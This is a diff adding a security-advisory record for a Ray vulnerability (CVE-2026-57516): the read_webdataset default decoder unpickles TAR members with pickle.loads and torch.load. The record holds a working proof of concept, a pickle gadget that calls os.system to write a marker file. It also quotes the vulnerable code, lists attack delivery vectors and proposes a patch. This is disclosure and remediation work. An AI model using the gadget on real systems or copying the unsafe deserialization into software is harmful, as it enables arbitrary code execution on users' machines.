@@ -1,0 +1,411 @@
+advisory_id: GHSA-hhrp-gw25-jr43
+datasource_id: github_osv/GHSA-hhrp-gw25-jr43
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-hhrp-gw25-jr43/GHSA-hhrp-gw25-jr43.json
+aliases:
+  - CVE-2026-57516
+summary: |
+  Ray: Arbitrary code execution via ray.data.read_webdataset default decoder: pickle.loads(value) and torch.load(weights_only=False)
+  ## Summary
+
+  `ray.data.read_webdataset(paths=...)` is a `@PublicAPI(stability="alpha")`
+  reader for WebDataset-format TAR files. Its default `decoder=True` invokes
+  `_default_decoder` on every sample's keys, which routes file extension to a
+  decoder by extension. Two of those branches deserialize attacker-controlled
+  bytes with no validation:
+
+  - `.pickle` / `.pkl` -> `pickle.loads(value)`
+  - `.pt`     / `.pth` -> `torch.load(io.BytesIO(value), weights_only=False)`
+
+  Both fire during a standard `ray.data.read_webdataset(...).take_all()` /
+  `.iter_batches()` call. No flags, no opt-in, no environment variable.
+  An attacker who can supply a TAR (via S3 share, HuggingFace Hub mirror,
+  email attachment, model-zoo, or any HTTP URL the user passes to
+  `read_webdataset`) achieves arbitrary code execution in the calling
+  Ray process at schema-sample time, before row data is consumed.
+
+  This is the same class of bug as GHSA-mw35-8rx3-xf9r (Parquet Arrow
+  Extension Type cloudpickle deserialization, patched in 2.55.0): standard
+  data-loading API, attacker-controlled file format, deserialization gadget
+  invoked transparently. The 2.55.0 patch addressed
+  `tensor_extensions/arrow.py:_deserialize_with_fallback` and made cloudpickle
+  opt-in via `RAY_DATA_AUTOLOAD_CLOUDPICKLE_TENSOR_METADATA=1`. The
+  WebDataset path is a different code site and was not touched.
+
+  ## Vulnerable code (HEAD `a157d4d`)
+
+  `python/ray/data/_internal/datasource/webdataset_datasource.py` lines
+  175-225, the `_default_decoder` function:
+
+  ```python
+  def _default_decoder(sample, format=True):
+      sample = dict(sample)
+      for key, value in sample.items():
+          extension = key.split(".")[-1]
+          ...
+          elif extension in ["pt", "pth"]:
+              import torch
+              # PyTorch 2.6 changed torch.load default weights_only=True, which
+              # breaks loading general Python objects previously serialized for
+              # WebDataset .pt payloads.
+              sample[key] = torch.load(io.BytesIO(value), weights_only=False)   # line 219
+          elif extension in ["pickle", "pkl"]:
+              import pickle
+              sample[key] = pickle.loads(value)                                 # line 223
+      return sample
+  ```
+
+  The comment for the `.pt/.pth` branch is itself a security smell: it
+  documents that the maintainer chose `weights_only=False` *to override*
+  PyTorch 2.6's safer default. The comment treats this as a compatibility
+  fix; it functionally re-enables an arbitrary-code-execution path that
+  upstream PyTorch closed.
+
+  ## Reachability and default-on confirmation
+
+  `python/ray/data/read_api.py:2289` defines `read_webdataset` with default
+  `decoder=True`:
+
+  ```python
+  @PublicAPI(stability="alpha")
+  def read_webdataset(
+      paths,
+      *,
+      ...
+      decoder: Optional[Union[bool, str, callable, list]] = True,
+      ...
+  ) -> Dataset:
+      ...
+      datasource = WebDatasetDatasource(paths, decoder=decoder, ...)
+  ```
+
+  `WebDatasetDatasource._read_stream` (line 367) calls the decoder
+  unconditionally when not None:
+
+  ```python
+  for sample in samples:
+      if self.decoder is not None:
+          sample = _apply_list(self.decoder, sample, default=_default_decoder)
+  ```
+
+  `True is not None` evaluates True, so the default decoder fires for every
+  invocation that doesn't explicitly pass `decoder=None` (or a custom safe
+  decoder). The documentation does not warn about the behavior.
+
+  ## End-to-end reproduction
+
+  Tested on a fresh venv (`pip install ray[data]`) on Linux x86_64. Ray
+  reports `__version__ == "2.55.1"` (the patched-against-GHSA-mw35 release):
+
+  ```python
+  import io, os, pickle, subprocess, tarfile, tempfile, sys
+
+  MARKER = "/tmp/ray_webdataset_poc_rce_marker"
+
+  class Gadget:
+      def __reduce__(self):
+          cmd = (f"/bin/sh -c \"printf 'RCE via ray.data.read_webdataset\\n"
+                 f"pid=%s\\nuser=%s\\n' \"$$\" \"$(whoami)\" > {MARKER}\"")
+          return (os.system, (cmd,))
+
+  with tempfile.NamedTemporaryFile(suffix=".tar", delete=False) as f:
+      tar_path = f.name
+  with tarfile.open(tar_path, "w") as tar:
+      for name, body in (("000000.txt", b"hello"),
+                         ("000000.pkl", pickle.dumps(Gadget()))):
+          ti = tarfile.TarInfo(name=name); ti.size = len(body)
+          tar.addfile(ti, io.BytesIO(body))
+
+  import ray, ray.data
+  ray.init(num_cpus=2, ignore_reinit_error=True, log_to_driver=False)
+  ds = ray.data.read_webdataset(paths=[tar_path])
+  rows = ds.take_all()
+  assert os.path.exists(MARKER), "no RCE"
+  print(open(MARKER).read())
+  ```
+
+  Output:
+
+  ```
+  ray version: 2.55.1
+  crafted /tmp/tmpjpos115h.tar (10240 bytes)
+  ds.take_all() returned 1 row(s)
+  RCE CONFIRMED:marker at /tmp/ray_webdataset_poc_rce_marker:
+      RCE via ray.data.read_webdataset
+      pid=248816
+      user=xyz
+  ```
+
+  The `.pt/.pth` variant is the exact same primitive against the
+  `torch.load(io.BytesIO(value), weights_only=False)` branch; replace the
+  TAR member with `000000.pt` containing `torch.save(Gadget())` to reproduce.
+
+  ## Real-world delivery vectors
+
+  - `paths=["s3://bucket/poisoned.tar"]` -- the user thinks they are reading
+    a WebDataset shard; the bucket is shared, mis-permissioned, or
+    compromised.
+  - `paths=["https://attacker/model.tar"]` -- HTTP-served WebDataset.
+  - HuggingFace Hub -- WebDataset is a recognized HF dataset format; users
+    pull TAR shards via `datasets` and feed them to Ray Data.
+  - Model-zoo / leaderboard tarballs -- common in CV/ASR workflows.
+
+  ## Why GHSA-mw35 doesn't cover this
+
+  GHSA-mw35-8rx3-xf9r patched `tensor_extensions/arrow.py:_deserialize_with_fallback`
+  by gating `cloudpickle.loads` behind
+  `RAY_DATA_AUTOLOAD_CLOUDPICKLE_TENSOR_METADATA=1`. That change touches
+  the Parquet ExtensionType deserialization path only. The advisory text
+  does not mention WebDataset, the WebDataset code is in a different
+  module, and the unsafe loads here use `pickle.loads` and
+  `torch.load(weights_only=False)` (not `cloudpickle.loads`).
+
+  ## Suggested patch
+
+  Two minimal options, both Ray-internal:
+
+  1. **Make the unsafe extensions opt-in**, mirroring the GHSA-mw35 fix
+     pattern. Replace the `.pt/.pth` and `.pkl/.pickle` branches with a
+     guard:
+
+     ```python
+     import os
+     _ALLOW_UNSAFE = os.environ.get(
+         "RAY_DATA_WEBDATASET_ALLOW_UNSAFE_PICKLE", "0"
+     ) == "1"
+
+     elif extension in ["pt", "pth"]:
+         if not _ALLOW_UNSAFE:
+             raise ValueError(
+                 f"Refusing to load .pt/.pth member {key!r} from WebDataset "
+                 f"with weights_only=False. Set "
+                 f"RAY_DATA_WEBDATASET_ALLOW_UNSAFE_PICKLE=1 only for trusted "
+                 f"sources."
+             )
+         sample[key] = torch.load(io.BytesIO(value), weights_only=False)
+
+     elif extension in ["pickle", "pkl"]:
+         if not _ALLOW_UNSAFE:
+             raise ValueError(
+                 f"Refusing to unpickle WebDataset member {key!r} -- "
+                 f"untrusted pickle is RCE. Provide your own decoder "
+                 f"or set RAY_DATA_WEBDATASET_ALLOW_UNSAFE_PICKLE=1 for "
+                 f"trusted sources."
+             )
+         sample[key] = pickle.loads(value)
+     ```
+
+  2. **Drop these branches from the default decoder entirely** and require
+     callers to provide their own decoder when working with .pkl/.pt
+     samples. This is the safer default, matches WebDataset upstream's
+     guidance ("by default, use safe decoders"), and is consistent with
+     the spirit of the GHSA-mw35 patch.
+
+  Either option flips the default-on RCE primitive into an explicit
+  opt-in. The current default-on behavior provides no signal to users
+  that calling `ray.data.read_webdataset` on an untrusted TAR is
+  equivalent to running attacker code.
+
+  ## References
+
+  - Source: `python/ray/data/_internal/datasource/webdataset_datasource.py:175-225`
+  - Public API: `python/ray/data/read_api.py:2287-2370` (`read_webdataset`)
+  - Sibling advisory of the same class: GHSA-mw35-8rx3-xf9r (Parquet
+    Arrow Extension Type, patched 2.55.0)
+  - Earlier related advisory: PR #45084 (2024) fixed PyExtensionType
+    cloudpickle but did not touch the WebDataset decoder.
+  - WebDataset format: https://github.com/webdataset/webdataset
+impacted_packages:
+  - purl: pkg:github/ray-project/ray
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/ray-project/ray
+        commit: 41443a18f9e6403a072de69098a279c23e2d943c
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:pypi/ray
+    affected_versions: vers:pypi/<2.56.0
+    fixed_versions: vers:pypi/2.56.0
+    affected_packages:
+      - pkg:pypi/ray@0.1.1
+      - pkg:pypi/ray@0.1.2
+      - pkg:pypi/ray@0.2.0
+      - pkg:pypi/ray@0.2.1
+      - pkg:pypi/ray@0.2.2
+      - pkg:pypi/ray@0.3.0
+      - pkg:pypi/ray@0.3.1
+      - pkg:pypi/ray@0.4.0
+      - pkg:pypi/ray@0.5.0
+      - pkg:pypi/ray@0.5.2
+      - pkg:pypi/ray@0.5.3
+      - pkg:pypi/ray@0.6.0
+      - pkg:pypi/ray@0.6.1
+      - pkg:pypi/ray@0.6.2
+      - pkg:pypi/ray@0.6.3
+      - pkg:pypi/ray@0.6.4
+      - pkg:pypi/ray@0.6.5
+      - pkg:pypi/ray@0.6.6
+      - pkg:pypi/ray@0.7.0
+      - pkg:pypi/ray@0.7.1
+      - pkg:pypi/ray@0.7.2
+      - pkg:pypi/ray@0.7.3
+      - pkg:pypi/ray@0.7.4
+      - pkg:pypi/ray@0.7.5
+      - pkg:pypi/ray@0.7.6
+      - pkg:pypi/ray@0.7.7
+      - pkg:pypi/ray@0.8.0
+      - pkg:pypi/ray@0.8.1
+      - pkg:pypi/ray@0.8.2
+      - pkg:pypi/ray@0.8.3
+      - pkg:pypi/ray@0.8.4
+      - pkg:pypi/ray@0.8.5
+      - pkg:pypi/ray@0.8.6
+      - pkg:pypi/ray@0.8.7
+      - pkg:pypi/ray@1.0.0
+      - pkg:pypi/ray@1.0.1
+      - pkg:pypi/ray@1.1.0
+      - pkg:pypi/ray@1.2.0
+      - pkg:pypi/ray@1.3.0
+      - pkg:pypi/ray@1.4.0
+      - pkg:pypi/ray@1.4.1
+      - pkg:pypi/ray@1.5.0
+      - pkg:pypi/ray@1.5.1
+      - pkg:pypi/ray@1.5.2
+      - pkg:pypi/ray@1.6.0
+      - pkg:pypi/ray@1.7.0
+      - pkg:pypi/ray@1.7.1
+      - pkg:pypi/ray@1.8.0
+      - pkg:pypi/ray@1.9.0
+      - pkg:pypi/ray@1.9.1
+      - pkg:pypi/ray@1.9.2
+      - pkg:pypi/ray@1.10.0
+      - pkg:pypi/ray@1.11.0
+      - pkg:pypi/ray@1.11.1
+      - pkg:pypi/ray@1.12.0
+      - pkg:pypi/ray@1.12.1
+      - pkg:pypi/ray@1.13.0
+      - pkg:pypi/ray@2.0.0
+      - pkg:pypi/ray@2.0.1
+      - pkg:pypi/ray@2.1.0
+      - pkg:pypi/ray@2.2.0
+      - pkg:pypi/ray@2.3.0rc0
+      - pkg:pypi/ray@2.3.0
+      - pkg:pypi/ray@2.3.1
+      - pkg:pypi/ray@2.4.0
+      - pkg:pypi/ray@2.5.0
+      - pkg:pypi/ray@2.5.1
+      - pkg:pypi/ray@2.6.0
+      - pkg:pypi/ray@2.6.1
+      - pkg:pypi/ray@2.6.2
+      - pkg:pypi/ray@2.6.3
+      - pkg:pypi/ray@2.7.0rc0
+      - pkg:pypi/ray@2.7.0
+      - pkg:pypi/ray@2.7.1
+      - pkg:pypi/ray@2.7.2
+      - pkg:pypi/ray@2.8.0
+      - pkg:pypi/ray@2.8.1
+      - pkg:pypi/ray@2.9.0
+      - pkg:pypi/ray@2.9.1
+      - pkg:pypi/ray@2.9.2
+      - pkg:pypi/ray@2.9.3
+      - pkg:pypi/ray@2.10.0
+      - pkg:pypi/ray@2.11.0
+      - pkg:pypi/ray@2.12.0
+      - pkg:pypi/ray@2.20.0
+      - pkg:pypi/ray@2.21.0
+      - pkg:pypi/ray@2.22.0
+      - pkg:pypi/ray@2.23.0
+      - pkg:pypi/ray@2.24.0
+      - pkg:pypi/ray@2.30.0
+      - pkg:pypi/ray@2.31.0
+      - pkg:pypi/ray@2.32.0rc0
+      - pkg:pypi/ray@2.32.0
+      - pkg:pypi/ray@2.33.0
+      - pkg:pypi/ray@2.34.0
+      - pkg:pypi/ray@2.35.0
+      - pkg:pypi/ray@2.36.0
+      - pkg:pypi/ray@2.36.1
+      - pkg:pypi/ray@2.37.0
+      - pkg:pypi/ray@2.38.0
+      - pkg:pypi/ray@2.39.0
+      - pkg:pypi/ray@2.40.0
+      - pkg:pypi/ray@2.41.0
+      - pkg:pypi/ray@2.42.0
+      - pkg:pypi/ray@2.42.1
+      - pkg:pypi/ray@2.43.0
+      - pkg:pypi/ray@2.44.0
+      - pkg:pypi/ray@2.44.1
+      - pkg:pypi/ray@2.45.0
+      - pkg:pypi/ray@2.46.0
+      - pkg:pypi/ray@2.47.0
+      - pkg:pypi/ray@2.47.1
+      - pkg:pypi/ray@2.48.0
+      - pkg:pypi/ray@2.49.0
+      - pkg:pypi/ray@2.49.1
+      - pkg:pypi/ray@2.49.2
+      - pkg:pypi/ray@2.50.0
+      - pkg:pypi/ray@2.50.1
+      - pkg:pypi/ray@2.51.0
+      - pkg:pypi/ray@2.51.1
+      - pkg:pypi/ray@2.51.2
+      - pkg:pypi/ray@2.52.0
+      - pkg:pypi/ray@2.52.1
+      - pkg:pypi/ray@2.53.0
+      - pkg:pypi/ray@2.54.0
+      - pkg:pypi/ray@2.54.1
+      - pkg:pypi/ray@2.55.0
+      - pkg:pypi/ray@2.55.1
+    fixed_packages:
+      - pkg:pypi/ray@2.56.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-hhrp-gw25-jr43/GHSA-hhrp-gw25-jr43.json
+  - score: '8.6'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-hhrp-gw25-jr43/GHSA-hhrp-gw25-jr43.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+  - CWE-502
+references:
+  - url: https://github.com/pypa/advisory-database/tree/main/vulns/ray/PYSEC-2026-2273.yaml
+    reference_type:
+    reference_id:
+  - url: https://github.com/ray-project/ray
+    reference_type:
+    reference_id:
+  - url: https://github.com/ray-project/ray/commit/41443a18f9e6403a072de69098a279c23e2d943c
+    reference_type:
+    reference_id:
+  - url: https://github.com/ray-project/ray/pull/63469
+    reference_type: bug
+    reference_id: 63469
+  - url: https://github.com/ray-project/ray/pull/63470
+    reference_type: bug
+    reference_id: 63470
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-57516
+    reference_type:
+    reference_id: CVE-2026-57516
+  - url: https://github.com/ray-project/ray/security/advisories/GHSA-hhrp-gw25-jr43
+    reference_type: advisory
+    reference_id: GHSA-hhrp-gw25-jr43
+  - url: https://github.com/ray-project/ray/releases/tag/ray-2.56.0
+    reference_type: other
+    reference_id: ray-2.56.0
+  - url: https://www.vulncheck.com/advisories/ray-unsafe-deserialization-rce-via-webdataset-reader
+    reference_type: advisory
+    reference_id: ray-unsafe-deserialization-rce-via-webdataset-reader
+exploits: []
